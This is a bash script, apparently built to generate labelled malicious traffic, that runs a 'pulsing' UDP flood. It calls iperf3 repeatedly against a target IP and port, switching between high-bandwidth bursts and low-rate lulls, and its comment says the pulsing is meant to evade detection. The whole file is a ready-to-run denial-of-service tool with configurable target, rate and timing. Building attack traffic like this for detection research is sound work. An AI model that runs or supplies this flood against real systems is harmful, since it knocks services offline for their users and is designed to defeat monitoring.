#!/bin/bash
# Malicious: Pulsing UDP Flood - alternating high/low rate periods to evade detection
# Usage: ./pulsing_udp_flood.sh <server_ip> [port] [duration_sec] [high_bandwidth] [low_bandwidth] [high_sec] [low_sec]
SERVER=${1:-127.0.0.1}
PORT=${2:-5201}
DURATION=${3:-120}
HIGH_BW=${4:-500M}
LOW_BW=${5:-10k}
HIGH_SEC=${6:-10}
LOW_SEC=${7:-20}
ELAPSED=0
while [ "$ELAPSED" -lt "$DURATION" ]; do
  REMAIN=$((DURATION-ELAPSED))
  T_HIGH=$(( HIGH_SEC < REMAIN ? HIGH_SEC : REMAIN ))
  if [ "$T_HIGH" -le 0 ]; then break; fi
  iperf3 -c "$SERVER" -p "$PORT" -u -b "$HIGH_BW" -t "$T_HIGH"
  ELAPSED=$((ELAPSED+T_HIGH))
  if [ "$ELAPSED" -ge "$DURATION" ]; then break; fi
  T_LOW=$(( LOW_SEC < (DURATION-ELAPSED) ? LOW_SEC : (DURATION-ELAPSED) ))
  iperf3 -c "$SERVER" -p "$PORT" -u -b "$LOW_BW" -t "$T_LOW"
  ELAPSED=$((ELAPSED+T_LOW))
done
